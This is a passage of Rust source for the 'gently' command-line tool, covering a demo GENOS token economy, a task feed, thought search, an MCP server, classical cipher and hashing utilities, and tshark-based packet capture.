        "bugfix" | "bug" => ContributionType::BugFix,
        "vector" => ContributionType::VectorChain,
        "gpu" => ContributionType::GpuSharing,
        "data" => ContributionType::DataContribution,
        "review" | "peer" => ContributionType::PeerReview,
        _ => ContributionType::CreativeThought,
    };

    // Generate content hash from title
    let mut hasher = Sha256::new();
    hasher.update(title.as_bytes());
    hasher.update(my_pubkey.as_bytes());
    let content_hash: [u8; 32] = hasher.finalize().into();

    with_demo_genos(|economy| {
        // Ensure user has a wallet
        economy.get_or_create_wallet(&my_pubkey);

        let contribution = economy.submit_contribution(
            &my_pubkey,
            contrib_type,
            &title,
            content_hash,
            None,
        );

        // Get base reward for this type
        let base_reward = contrib_type.base_reward();

        println!("\n  CONTRIBUTION SUBMITTED");
        println!("  ======================\n");
        println!("  ID:       {}", contribution.id);
        println!("  Type:     {:?}", contrib_type);
        println!("  Title:    {}", title);
        println!("  Status:   {:?}", contribution.status);
        println!();
        println!("  Estimated reward: {:.1} - {:.1} GENOS",
            base_reward * 0.5, base_reward * 1.0);
        println!("  (Final amount depends on quality and originality scores)");
        println!();
        println!("  Your contribution is now pending review.");
        println!("  Rewards are distributed after validation.");
        println!();
        println!("  CONTRIBUTION VALUE BY TYPE:");
        println!("  ----------------------------");
        println!("  CreativeThought: 5-10 GENOS");
        println!("  Code:            4-8 GENOS");
        println!("  Research:        6-12 GENOS");
        println!("  BugFix:          1.5-3 GENOS");
        println!("  VectorChain:     1-2 GENOS");
    });

    Ok(())
}

fn cmd_genos_gpu_register(model: String, vram: u32, rate: f64) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    // Estimate compute TFLOPs based on model name
    let compute_tflops = if model.to_lowercase().contains("4090") {
        82.0
    } else if model.to_lowercase().contains("4080") {
        49.0
    } else if model.to_lowercase().contains("3090") {
        36.0
    } else if model.to_lowercase().contains("a100") {
        156.0
    } else {
        20.0 // Default
    };

    with_demo_genos(|economy| {
        let provider = economy.register_gpu_provider(
            &my_pubkey,
            &model,
            vram,
            compute_tflops,
            8, // Default 8 hours availability
            GenosAmount::from_genos(rate),
        );

        println!("\n  GPU PROVIDER REGISTERED");
        println!("  =======================\n");
        println!("  Owner:       {}...", &my_pubkey[..24]);
        println!();
        println!("  HARDWARE:");
        println!("  ----------");
        println!("  GPU Model:    {}", provider.gpu_model);
        println!("  VRAM:         {} GB", provider.vram_gb);
        println!("  Compute:      {:.1} TFLOPS", provider.compute_tflops);
        println!("  Availability: {} hours/day", provider.availability_hours);
        println!("  Online:       {}", if provider.online { "Yes" } else { "No" });
        println!();
        println!("  PRICING:");
        println!("  ---------");
        println!("  Hourly Rate:  {}", provider.hourly_rate);
        println!("  Total Hours:  {}", provider.total_hours);
        println!("  Total Earned: {}", provider.total_earned);
        println!();
        println!("  Your GPU is now available for:");
        println!("  - AI inference requests");
        println!("  - Model fine-tuning jobs");
        println!("  - Embedding generation");
        println!("  - ML training tasks");
        println!();
        println!("  Earnings will be credited automatically.");
    });

    Ok(())
}

fn cmd_genos_gpu_job(kind: String, hours: f32, budget: f64) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    let job_type = match kind.to_lowercase().as_str() {
        "inference" => GpuJobType::Inference,
        "training" => GpuJobType::Training,
        "finetuning" | "finetune" => GpuJobType::FineTuning,
        "embedding" | "embeddings" => GpuJobType::Embedding,
        _ => GpuJobType::Inference,
    };

    let budget_amount = GenosAmount::from_genos(budget);

    with_demo_genos(|economy| {
        // Ensure user has a wallet and funds
        let current_balance = economy.balance(&my_pubkey);
        if current_balance.raw() < budget_amount.raw() {
            // Give some test tokens for demo
            let needed = GenosAmount::from_genos(budget + 10.0);
            economy.get_or_create_wallet(&my_pubkey).credit(needed);
            println!("  (Demo: credited {} for testing)", needed);
        }

        match economy.submit_gpu_job(&my_pubkey, job_type, hours, budget_amount) {
            Ok(job) => {
                println!("\n  GPU JOB SUBMITTED");
                println!("  ==================\n");
                println!("  Job ID:      {}", job.id);
                println!("  Type:        {:?}", job.job_type);
                println!("  Status:      {:?}", job.status);
                println!();
                println!("  REQUIREMENTS:");
                println!("  -------------");
                println!("  Est. Hours:  {:.1}", job.estimated_hours);
                println!("  Budget:      {}", job.budget);
                println!();
                println!("  MATCHING:");
                println!("  ---------");
                if let Some(provider_wallet) = &job.provider {
                    println!("  Provider:    {}...", &provider_wallet[..20.min(provider_wallet.len())]);
                    println!("  Status:      Assigned");
                } else {
                    println!("  Provider:    Searching for available GPU...");
                    println!("  Status:      Queued");
                }
                println!();
                println!("  Your job will be matched with available GPU providers.");
                println!("  Payment is escrowed until job completion.");
                println!();
                println!("  New balance: {}", economy.balance(&my_pubkey));
            }
            Err(e) => {
                println!("\n  GPU JOB FAILED");
                println!("  Error: {}", e);
            }
        }
    });

    Ok(())
}

fn cmd_genos_vector(metadata: String) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    // Generate a simple embedding from metadata hash
    let mut hasher = Sha256::new();
    hasher.update(metadata.as_bytes());
    let hash: [u8; 32] = hasher.finalize().into();

    // Convert to float embedding (simple demo)
    let embedding: Vec<f32> = hash.iter()
        .map(|&b| (b as f32 / 255.0) * 2.0 - 1.0) // Normalize to [-1, 1]
        .collect();

    with_demo_genos(|economy| {
        let link = economy.add_vector_chain(
            &my_pubkey,
            embedding,
            &metadata,
            None,
        );

        println!("\n  VECTOR CHAIN ADDED");
        println!("  ==================\n");
        println!("  Link ID:     {}", link.id);
        println!("  Contributor: {}...", &my_pubkey[..24]);
        println!("  Metadata:    {}", link.metadata);
        println!();
        println!("  EMBEDDING:");
        println!("  ----------");
        println!("  Dimensions:  {}", link.embedding.len());
        println!("  Quality:     {:.2}", link.quality);
        println!("  Propagation: {}", link.propagation);
        println!();
        println!("  REWARD:");
        println!("  -------");
        println!("  Base Value: {}", link.value);
        println!();
        println!("  Vector chains wire the knowledge network.");
        println!("  Rewards grow as others connect to your contribution.");
        println!("  Higher quality = more connections = more GENOS.");
        println!();
        println!("  New balance: {}", economy.balance(&my_pubkey));
    });

    Ok(())
}

fn cmd_genos_stats() -> Result<()> {
    with_demo_genos(|economy| {
        let stats = economy.stats();

        println!("\n  GENOS ECONOMY STATS");
        println!("  ====================\n");

        println!("  TOKEN SUPPLY:");
        println!("  -------------");
        println!("  Total Supply:     {}", stats.total_supply);
        println!("  Circulating:      {}", stats.circulating);
        println!("  Community Pool:   {}", stats.community_pool);
        println!("  GPU Pool:         {}", stats.gpu_pool);
        println!("  Treasury:         {}", stats.treasury);
        println!();

        println!("  NETWORK ACTIVITY:");
        println!("  -----------------");
        println!("  Total Wallets:       {}", stats.total_wallets);
        println!("  GPU Providers:       {}", stats.total_gpu_providers);
        println!("  Vector Links:        {}", stats.total_vector_chains);
        println!();

        println!("  CONTRIBUTIONS:");
        println!("  --------------");
        println!("  Total Submitted:     {}", stats.total_contributions);
        println!();

        println!("  GPU COMPUTE:");
        println!("  ------------");
        println!("  Active Jobs:  {}", economy.gpu_jobs.len());
        println!("  Providers:    {}", economy.gpu_providers.len());
        println!();

        println!("  DISTRIBUTION:");
        println!("  -------------");
        println!("  40% Community Pool - Mining rewards");
        println!("  25% Development    - Platform development");
        println!("  20% GPU Rewards    - Compute sharing");
        println!("  15% Treasury       - Operations");
    });

    Ok(())
}

fn cmd_genos_info() -> Result<()> {
    println!("\n  GENOS - PROOF OF THOUGHT TOKEN");
    println!("  ================================\n");

    println!("  Symbol:   {}", gently_spl::GENOS_SYMBOL);
    println!("  Name:     {}", gently_spl::GENOS_NAME);
    println!("  Decimals: {}", gently_spl::GENOS_DECIMALS);
    println!("  Supply:   {} GENOS", gently_spl::GENOS_TOTAL_SUPPLY / 1_000_000_000);
    println!();

    println!("  WHAT IS GENOS?");
    println!("  --------------");
    println!("  GENOS is the valuable proof-of-thought token in GentlyOS.");
    println!("  Unlike GOS (governance tokens), GENOS has real value.");
    println!("  It rewards contributors and powers the AI economy.");
    println!();

    println!("  EARNING GENOS:");
    println!("  --------------");
    println!("  1. CONTRIBUTIONS - Submit creative thoughts, code, research");
    println!("     - CreativeThought: 1-10 GENOS");
    println!("     - Code:            5-50 GENOS");
    println!("     - Research:        10-100 GENOS");
    println!("     - BugFix:          2-20 GENOS");
    println!("     - Design:          3-30 GENOS");
    println!();
    println!("  2. GPU SHARING - Provide compute for AI tasks");
    println!("     - Register your GPU (NVIDIA, AMD, etc.)");
    println!("     - Set your hourly rate in GENOS");
    println!("     - Earn when others use your compute");
    println!();
    println!("  3. VECTOR CHAINS - Build the knowledge network");
    println!("     - Add embeddings/metadata to the chain");
    println!("     - Earn when others connect to your links");
    println!("     - Quality contributions = more connections");
    println!();

    println!("  SPENDING GENOS:");
    println!("  ---------------");
    println!("  - AI Inference: Pay for model inference time");
    println!("  - GPU Jobs:     Submit training/fine-tuning jobs");
    println!("  - Data Access:  Query the vector knowledge base");
    println!("  - Premium:      Unlock advanced features");
    println!();

    println!("  COMMANDS:");
    println!("  ---------");
    println!("  gently genos balance     - Check your GENOS balance");
    println!("  gently genos contribute  - Submit contribution for reward");
    println!("  gently genos gpu-register - Register as GPU provider");
    println!("  gently genos gpu-job     - Submit GPU compute job");
    println!("  gently genos vector      - Add to vector chain");
    println!("  gently genos stats       - View economy statistics");

    Ok(())
}

// ===== FEED COMMANDS =====

fn cmd_feed(command: FeedCommands) -> Result<()> {
    match command {
        FeedCommands::Show { filter } => cmd_feed_show(filter),
        FeedCommands::Add { name, kind, tags } => cmd_feed_add(name, kind, tags),
        FeedCommands::Boost { name, amount } => cmd_feed_boost(name, amount),
        FeedCommands::Step { item, step } => cmd_feed_step(item, step),
        FeedCommands::Done { item, step_id } => cmd_feed_done(item, step_id),
        FeedCommands::Freeze { name } => cmd_feed_freeze(name),
        FeedCommands::Archive { name } => cmd_feed_archive(name),
        FeedCommands::Process { text } => cmd_feed_process(text),
        FeedCommands::Export { output } => cmd_feed_export(output),
    }
}

fn load_feed() -> LivingFeed {
    FeedStorage::default_location()
        .ok()
        .and_then(|s| s.load().ok())
        .unwrap_or_else(LivingFeed::new)
}

fn save_feed(feed: &LivingFeed) -> Result<()> {
    if let Ok(storage) = FeedStorage::default_location() {
        storage.save(feed)?;
    }
    Ok(())
}

fn cmd_feed_show(filter: String) -> Result<()> {
    let feed = load_feed();

    println!("\n  LIVING FEED");
    println!("  ============\n");

    let items: Vec<_> = match filter.as_str() {
        "hot" => feed.hot_items(),
        "active" => feed.active_items(),
        "cooling" => feed.cooling_items(),
        "frozen" => feed.frozen_items(),
        _ => feed.items().iter().filter(|i| !i.archived).collect(),
    };

    if items.is_empty() {
        println!("  (no items matching filter '{}')", filter);
        println!();
        println!("  Use 'gently feed add <name>' to add items.");
    } else {
        // Group by state
        let hot: Vec<_> = items.iter().filter(|i| i.charge > 0.8).collect();
        let active: Vec<_> = items.iter().filter(|i| i.charge > 0.4 && i.charge <= 0.8).collect();
        let cooling: Vec<_> = items.iter().filter(|i| i.charge > 0.1 && i.charge <= 0.4).collect();
        let frozen: Vec<_> = items.iter().filter(|i| i.charge <= 0.1).collect();

        if !hot.is_empty() {
            println!("  🔥 HOT");
            for item in hot {
                println!("    • {} [{:.2}] {}", item.name, item.charge,
                    if item.pinned { "📌" } else { "" });
                for step in item.pending_steps() {
                    println!("      - [ ] {}", step.content);
                }
            }
            println!();
        }

        if !active.is_empty() {
            println!("  ⚡ ACTIVE");
            for item in active {
                println!("    • {} [{:.2}]", item.name, item.charge);
            }
            println!();
        }

        if !cooling.is_empty() {
            println!("  💤 COOLING");
            for item in cooling {
                println!("    • {} [{:.2}]", item.name, item.charge);
            }
            println!();
        }

        if !frozen.is_empty() && filter == "all" {
            println!("  ❄️ FROZEN");
            for item in frozen {
                println!("    • {} [{:.2}]", item.name, item.charge);
            }
            println!();
        }
    }

    println!("  Chain: {}", feed.xor_chain().render());

    Ok(())
}

fn cmd_feed_add(name: String, kind: String, tags: Option<String>) -> Result<()> {
    let mut feed = load_feed();

    let item_kind = match kind.to_lowercase().as_str() {
        "project" => ItemKind::Project,
        "task" => ItemKind::Task,
        "idea" => ItemKind::Idea,
        "reference" => ItemKind::Reference,
        "person" => ItemKind::Person,
        _ => ItemKind::Project,
    };

    let id = feed.add_item(&name, item_kind.clone());

    // Add tags if provided
    if let Some(tag_str) = tags {
        if let Some(item) = feed.get_item_mut(id) {
            for tag in tag_str.split(',') {
                item.add_tag(tag.trim());
            }
        }
    }

    save_feed(&feed)?;

    println!("\n  ITEM ADDED");
    println!("  ==========\n");
    println!("  Name:  {}", name);
    println!("  Kind:  {:?}", item_kind);
    println!("  Charge: 1.0 (hot)");
    println!();
    println!("  Use 'gently feed step \"{}\" \"task\"' to add steps.", name);

    Ok(())
}

fn cmd_feed_boost(name: String, amount: f32) -> Result<()> {
    let mut feed = load_feed();

    if feed.boost(&name, amount) {
        let item = feed.get_item_by_name(&name).unwrap();
        save_feed(&feed)?;

        println!("\n  ITEM BOOSTED");
        println!("  ============\n");
        println!("  Name:      {}", item.name);
        println!("  New Charge: {:.2}", item.charge);
        println!("  State:     {:?}", item.state);
    } else {
        anyhow::bail!("Item '{}' not found", name);
    }

    Ok(())
}

fn cmd_feed_step(item: String, step: String) -> Result<()> {
    let mut feed = load_feed();

    if let Some(step_id) = feed.add_step(&item, &step) {
        save_feed(&feed)?;

        println!("\n  STEP ADDED");
        println!("  ==========\n");
        println!("  Item: {}", item);
        println!("  Step #{}: {}", step_id, step);
    } else {
        anyhow::bail!("Item '{}' not found", item);
    }

    Ok(())
}

fn cmd_feed_done(item: String, step_id: u32) -> Result<()> {
    let mut feed = load_feed();

    if feed.complete_step(&item, step_id) {
        save_feed(&feed)?;

        println!("\n  STEP COMPLETED");
        println!("  ==============\n");
        println!("  Item: {}", item);
        println!("  Step #{}: Done!", step_id);
    } else {
        anyhow::bail!("Step #{} not found in '{}'", step_id, item);
    }

    Ok(())
}

fn cmd_feed_freeze(name: String) -> Result<()> {
    let mut feed = load_feed();

    if feed.freeze(&name) {
        save_feed(&feed)?;
        println!("\n  Item '{}' frozen.", name);
    } else {
        anyhow::bail!("Item '{}' not found", name);
    }

    Ok(())
}

fn cmd_feed_archive(name: String) -> Result<()> {
    let mut feed = load_feed();

    if feed.archive(&name) {
        save_feed(&feed)?;
        println!("\n  Item '{}' archived.", name);
    } else {
        anyhow::bail!("Item '{}' not found", name);
    }

    Ok(())
}

fn cmd_feed_process(text: String) -> Result<()> {
    let mut feed = load_feed();

    feed.process(&text);
    save_feed(&feed)?;

    println!("\n  CONTEXT PROCESSED");
    println!("  =================\n");
    println!("  Text: \"{}\"", text);
    println!();
    println!("  Updated feed based on mentions and context.");
    println!("  Use 'gently feed show' to see changes.");

    Ok(())
}

fn cmd_feed_export(output: Option<String>) -> Result<()> {
    let feed = load_feed();
    let storage = FeedStorage::default_location()?;

    let md = storage.export_markdown(&feed);

    match output {
        Some(path) => {
            std::fs::write(&path, &md)?;
            println!("\n  Exported to: {}", path);
        }
        None => {
            println!("{}", md);
        }
    }

    Ok(())
}

// ===== SEARCH COMMANDS =====

fn cmd_search(command: SearchCommands) -> Result<()> {
    match command {
        SearchCommands::Add { content, source, tags } => cmd_search_add(content, source, tags),
        SearchCommands::Query { query, limit, feed } => cmd_search_query(query, limit, feed),
        SearchCommands::Stats => cmd_search_stats(),
        SearchCommands::Recent { limit } => cmd_search_recent(limit),
        SearchCommands::Domain { domain } => cmd_search_domain(domain),
    }
}

fn load_index() -> ThoughtIndex {
    ThoughtIndex::load(ThoughtIndex::default_path())
        .unwrap_or_else(|_| ThoughtIndex::new())
}

fn save_index(index: &ThoughtIndex) -> Result<()> {
    let path = ThoughtIndex::default_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    index.save(&path)?;
    Ok(())
}

fn cmd_search_add(content: String, source: Option<String>, tags: Option<String>) -> Result<()> {
    let mut index = load_index();

    let mut thought = match source {
        Some(src) => Thought::with_source(&content, src),
        None => Thought::new(&content),
    };

    if let Some(tag_str) = tags {
        for tag in tag_str.split(',') {
            thought.add_tag(tag.trim());
        }
    }

    let id = index.add_thought(thought.clone());
    save_index(&index)?;

    println!("\n  THOUGHT ADDED");
    println!("  =============\n");
    println!("  ID:       {}", id);
    println!("  Address:  {}", thought.address);
    println!("  Domain:   {} ({:?})", thought.shape.domain, thought.shape.kind);
    println!("  Keywords: {:?}", thought.shape.keywords);

    Ok(())
}

fn cmd_search_query(query: String, limit: usize, use_feed: bool) -> Result<()> {
    let index = load_index();
    let feed = if use_feed { Some(load_feed()) } else { None };

    let router = ContextRouter::new()
        .with_max_results(limit)
        .with_feed_boost(use_feed);

    let results = router.search(&query, &index, feed.as_ref());

    println!("\n  SEARCH RESULTS");
    println!("  ==============\n");
    println!("  Query: \"{}\"", query);
    println!("  Found: {} results\n", results.len());

    for (i, result) in results.iter().enumerate() {
        println!("  [{}] Score: {:.2}", i + 1, result.score);
        println!("      {}", result.thought.render_compact());
        if !result.wormholes.is_empty() {
            println!("      (via {} wormholes)", result.wormholes.len());
        }
        println!();
    }

    Ok(())
}

fn cmd_search_stats() -> Result<()> {
    let index = load_index();
    let stats = index.stats();

    println!("\n  THOUGHT INDEX STATS");
    println!("  ====================\n");
    println!("  Thoughts:  {}", stats.thought_count);
    println!("  Wormholes: {}", stats.wormhole_count);
    println!("  Domains:   {}", stats.domains_used);
    println!();
    println!("  Historical:");
    println!("    Total thoughts ever:  {}", stats.total_thoughts_ever);
    println!("    Total wormholes ever: {}", stats.total_wormholes_ever);

    Ok(())
}

fn cmd_search_recent(limit: usize) -> Result<()> {
    let index = load_index();

    println!("\n  RECENT THOUGHTS");
    println!("  ================\n");

    for thought in index.recent_thoughts(limit) {
        println!("  {}", thought.render_compact());
    }

    Ok(())
}

fn cmd_search_domain(domain: u8) -> Result<()> {
    let index = load_index();

    println!("\n  DOMAIN {} THOUGHTS", domain);
    println!("  ===================\n");

    let thoughts = index.thoughts_in_domain(domain);
    if thoughts.is_empty() {
        println!("  (no thoughts in domain {})", domain);
    } else {
        for thought in thoughts {
            println!("  {}", thought.render_compact());
        }
    }

    Ok(())
}

// ===== MCP COMMANDS =====

fn cmd_mcp(command: McpCommands) -> Result<()> {
    match command {
        McpCommands::Serve => cmd_mcp_serve(),
        McpCommands::Tools => cmd_mcp_tools(),
        McpCommands::Info => cmd_mcp_info(),
    }
}

fn cmd_mcp_serve() -> Result<()> {
    eprintln!("Starting GentlyOS MCP server...");

    let context = gently_mcp::tools::ToolContext::load()
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    let server = McpServer::with_context(context);
    server.run()
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    Ok(())
}

fn cmd_mcp_tools() -> Result<()> {
    let handler = McpHandler::new();

    println!("\n  MCP TOOLS");
    println!("  =========\n");

    for tool in handler.registry().definitions() {
        println!("  {} - {}", tool.name, tool.description);
    }

    println!();
    println!("  Use 'gently mcp serve' to start the MCP server.");

    Ok(())
}

fn cmd_mcp_info() -> Result<()> {
    println!("\n  MCP SERVER INFO");
    println!("  ================\n");
    println!("  Name:     gently-mcp");
    println!("  Version:  {}", env!("CARGO_PKG_VERSION"));
    println!("  Protocol: MCP 2024-11-05");
    println!();
    println!("  SANDBOXED CLAUDE INTEGRATION");
    println!("  -----------------------------");
    println!("  GentlyOS provides MCP tools for Claude CLI.");
    println!("  Your Claude runs with YOUR API key.");
    println!("  GentlyOS never sees your credentials.");
    println!();
    println!("  AVAILABLE TOOLS:");
    println!("  -----------------");
    println!("  living_feed_show   - View feed state");
    println!("  living_feed_boost  - Boost item charge");
    println!("  living_feed_add    - Add feed item");
    println!("  living_feed_step   - Add step to item");
    println!("  thought_add        - Add thought to index");
    println!("  thought_search     - Search thoughts");
    println!("  dance_initiate     - Start Dance handshake");
    println!("  identity_verify    - Verify via Dance");
    println!();
    println!("  USAGE:");
    println!("  -------");
    println!("  1. Start server: gently mcp serve");
    println!("  2. Configure Claude CLI to use the server");
    println!("  3. Claude can now invoke GentlyOS tools");

    Ok(())
}

// ═══════════════════════════════════════════════════════════════════════════
// CIPHER COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

fn cmd_cipher(command: CipherCommands) -> Result<()> {
    match command {
        CipherCommands::Identify { input } => {
            println!("\n  CIPHER IDENTIFICATION");
            println!("  =====================\n");

            let matches = CipherIdentifier::identify(&input);

            if matches.is_empty() {
                println!("  No matches found for input.");
                println!("  Length: {} characters", input.len());
            } else {
                println!("  Input: {}...", &input[..input.len().min(40)]);
                println!("  Length: {} characters\n", input.len());
                println!("  POSSIBLE TYPES:");
                for m in matches {
                    let conf = match m.confidence {
                        gently_cipher::identifier::Confidence::Certain => "CERTAIN",
                        gently_cipher::identifier::Confidence::High => "HIGH   ",
                        gently_cipher::identifier::Confidence::Medium => "MEDIUM ",
                        gently_cipher::identifier::Confidence::Low => "LOW    ",
                    };
                    println!("  [{conf}] {:?} - {}", m.cipher_type, m.reason);
                }
            }

            // Also check if it's a hash
            println!("\n  HASH CHECK:");
            println!("  {}", HashIdentifier::render(&input));

            Ok(())
        }

        CipherCommands::Encode { algo, text } => {
            let result = match algo.to_lowercase().as_str() {
                "base64" => Encoding::base64_encode(text.as_bytes()),
                "hex" => Encoding::hex_encode(text.as_bytes()),
                "binary" => Encoding::binary_encode(text.as_bytes()),
                "morse" => Encoding::morse_encode(&text),
                "rot13" => Encoding::rot13(&text),
                "rot47" => Encoding::rot47(&text),
                "url" => Encoding::url_encode(&text),
                _ => anyhow::bail!("Unknown encoding: {}. Use: base64, hex, binary, morse, rot13, rot47, url", algo),
            };

            println!("\n  ENCODE ({})", algo.to_uppercase());
            println!("  Input:  {}", text);
            println!("  Output: {}", result);
            Ok(())
        }

        CipherCommands::Decode { algo, text } => {
            let result = match algo.to_lowercase().as_str() {
                "base64" => String::from_utf8(Encoding::base64_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?)?,
                "hex" => String::from_utf8(Encoding::hex_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?)?,
                "binary" => String::from_utf8(Encoding::binary_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?)?,
                "morse" => Encoding::morse_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?,
                "rot13" => Encoding::rot13(&text),
                "rot47" => Encoding::rot47(&text),
                "url" => Encoding::url_decode(&text)
                    .map_err(|e| anyhow::anyhow!("{}", e))?,
                _ => anyhow::bail!("Unknown encoding: {}. Use: base64, hex, binary, morse, rot13, rot47, url", algo),
            };

            println!("\n  DECODE ({})", algo.to_uppercase());
            println!("  Input:  {}", text);
            println!("  Output: {}", result);
            Ok(())
        }

        CipherCommands::Encrypt { cipher, key, text } => {
            let result = match cipher.to_lowercase().as_str() {
                "caesar" => {
                    let shift: i32 = key.parse()?;
                    Cipher::caesar_encrypt(&text, shift)
                }
                "vigenere" => Cipher::vigenere_encrypt(&text, &key)
                    .map_err(|e| anyhow::anyhow!("{}", e))?,
                "atbash" => Cipher::atbash(&text),
                "affine" => {
                    let parts: Vec<&str> = key.split(',').collect();
                    if parts.len() != 2 {
                        anyhow::bail!("Affine key must be 'a,b' format");
                    }
                    let a: i32 = parts[0].parse()?;
                    let b: i32 = parts[1].parse()?;
                    Cipher::affine_encrypt(&text, a, b)
                        .map_err(|e| anyhow::anyhow!("{}", e))?
                }
                "railfence" => {
                    let rails: usize = key.parse()?;
                    Cipher::rail_fence_encrypt(&text, rails)
                        .map_err(|e| anyhow::anyhow!("{}", e))?
                }
                "xor" => {
                    let encrypted = Cipher::xor_encrypt(text.as_bytes(), key.as_bytes());
                    hex::encode(&encrypted)
                }
                _ => anyhow::bail!("Unknown cipher: {}. Use: caesar, vigenere, atbash, affine, railfence, xor", cipher),
            };

            println!("\n  ENCRYPT ({})", cipher.to_uppercase());
            println!("  Key:    {}", key);
            println!("  Input:  {}", text);
            println!("  Output: {}", result);
            Ok(())
        }

        CipherCommands::Decrypt { cipher, key, text } => {
            let result = match cipher.to_lowercase().as_str() {
                "caesar" => {
                    let shift: i32 = key.parse()?;
                    Cipher::caesar_decrypt(&text, shift)
                }
                "vigenere" => Cipher::vigenere_decrypt(&text, &key)
                    .map_err(|e| anyhow::anyhow!("{}", e))?,
                "atbash" => Cipher::atbash(&text),
                "affine" => {
                    let parts: Vec<&str> = key.split(',').collect();
                    if parts.len() != 2 {
                        anyhow::bail!("Affine key must be 'a,b' format");
                    }
                    let a: i32 = parts[0].parse()?;
                    let b: i32 = parts[1].parse()?;
                    Cipher::affine_decrypt(&text, a, b)
                        .map_err(|e| anyhow::anyhow!("{}", e))?
                }
                "railfence" => {
                    let rails: usize = key.parse()?;
                    Cipher::rail_fence_decrypt(&text, rails)
                        .map_err(|e| anyhow::anyhow!("{}", e))?
                }
                "xor" => {
                    let ciphertext = hex::decode(&text)?;
                    let decrypted = Cipher::xor_decrypt(&ciphertext, key.as_bytes());
                    String::from_utf8(decrypted)?
                }
                _ => anyhow::bail!("Unknown cipher: {}. Use: caesar, vigenere, atbash, affine, railfence, xor", cipher),
            };

            println!("\n  DECRYPT ({})", cipher.to_uppercase());
            println!("  Key:    {}", key);
            println!("  Input:  {}", text);
            println!("  Output: {}", result);
            Ok(())
        }

        CipherCommands::Bruteforce { text } => {
            println!("\n  CAESAR BRUTEFORCE");
            println!("  ==================\n");
            println!("  Ciphertext: {}\n", text);

            for (shift, decrypted) in Cipher::caesar_bruteforce(&text) {
                println!("  [{:2}] {}", shift, decrypted);
            }
            Ok(())
        }

        CipherCommands::Hash { algo, data } => {
            println!("\n  HASH GENERATION");
            println!("  ================\n");

            match algo.to_lowercase().as_str() {
                "md5" => println!("  MD5:     {}", Hashes::md5(data.as_bytes())),
                "sha1" => println!("  SHA-1:   {}", Hashes::sha1(data.as_bytes())),
                "sha256" => println!("  SHA-256: {}", Hashes::sha256(data.as_bytes())),
                "sha512" => println!("  SHA-512: {}", Hashes::sha512(data.as_bytes())),
                "all" | _ => {
                    let results = Hashes::hash_all(data.as_bytes());
                    println!("{}", results.render());
                }
            }
            Ok(())
        }

        CipherCommands::Analyze { text, chart } => {
            let analysis = FrequencyAnalysis::analyze(&text);

            if chart {
                println!("{}", analysis.render_ascii());
            } else {
                println!("\n  FREQUENCY ANALYSIS");
                println!("  ==================\n");
                println!("  Total characters: {}", analysis.total_chars);
                println!("  Index of Coincidence: {:.4}", analysis.index_of_coincidence());
                println!("  Chi-squared (English): {:.4}", analysis.chi_squared_english());

                println!("\n  TOP 5 CHARACTERS:");
                for (c, count) in analysis.top_chars(5) {
                    println!("    {} - {} ({:.2}%)", c, count, analysis.frequency_percent(c));
                }

                println!("\n  TOP 5 BIGRAMS:");
                for (bi, count) in analysis.top_bigrams(5) {
                    println!("    {} - {}", bi, count);
                }

                // Kasiski for Vigenère
                let key_lengths = analysis.kasiski_examination(&text);
                if !key_lengths.is_empty() {
                    println!("\n  LIKELY KEY LENGTHS (Kasiski):");
                    for len in key_lengths {
                        println!("    {}", len);
                    }
                }
            }
            Ok(())
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// NETWORK COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

fn cmd_network(command: NetworkCommands) -> Result<()> {
    match command {
        NetworkCommands::Interfaces => {
            println!("\n  NETWORK INTERFACES");
            println!("  ==================\n");

            match PacketCapture::list_interfaces() {
                Ok(interfaces) => {
                    for iface in interfaces {
                        println!("  {}. {} {}",
                            iface.index,
                            iface.name,
                            iface.description.as_deref().unwrap_or("")
                        );
                    }
                }
                Err(e) => {
                    println!("  Error listing interfaces: {}", e);
                    println!("  Make sure tshark is installed: apt install tshark");
                }
            }
            Ok(())
        }

        NetworkCommands::Capture { interface, filter, count, output } => {
            println!("\n  PACKET CAPTURE");
            println!("  ==============\n");
            println!("  Interface: {}", interface);
            if let Some(f) = &filter {
                println!("  Filter: {}", f);
            }

            let mut capture = PacketCapture::new(&interface);
            if let Some(f) = filter {
                capture = capture.filter(&f);
            }
            if let Some(c) = count {
                capture = capture.limit(c);
            }

            if let Some(out) = output {
                println!("  Output: {}", out);
                println!("\n  Capturing... (10 seconds)");
                match capture.capture_to_file(&out, 10) {
                    Ok(msg) => println!("  {}", msg),
                    Err(e) => println!("  Error: {}", e),
                }
            } else {
                println!("  Starting live capture...\n");
                match capture.start_capture() {
                    Ok(mut session) => {
                        let limit = count.unwrap_or(10);
                        for _ in 0..limit {
                            if let Some(packet) = session.next_packet() {
                                println!("  {} -> {} [{}] {} bytes",
                                    packet.source, packet.destination,
                                    packet.protocol, packet.length
                                );
                            }
                        }
                        println!("\n  Captured {} packets", session.stats().packets_captured);
                    }
                    Err(e) => println!("  Error: {}", e),
                }
            }
            Ok(())
        }

        NetworkCommands::Read { file, filter } => {
            println!("\n  READ PCAP FILE");
            println!("  ==============\n");
            println!("  File: {}", file);

            let packets = if let Some(f) = filter {
                println!("  Filter: {}", f);
                gently_network::capture::PacketCapture::filter_file(&file, &f)
            } else {
                gently_network::capture::PacketCapture::read_file(&file)
            };

            match packets {
                Ok(pkts) => {
                    println!("\n  Found {} packets:\n", pkts.len());
                    for p in pkts.iter().take(20) {
                        println!("  {} -> {} [{}] {} bytes",
                            p.source, p.destination, p.protocol, p.length
                        );
                    }
                    if pkts.len() > 20 {
                        println!("  ... and {} more", pkts.len() - 20);
                    }
                }
                Err(e) => println!("  Error: {}", e),
            }
            Ok(())
        }

        NetworkCommands::HttpExtract { file } => {
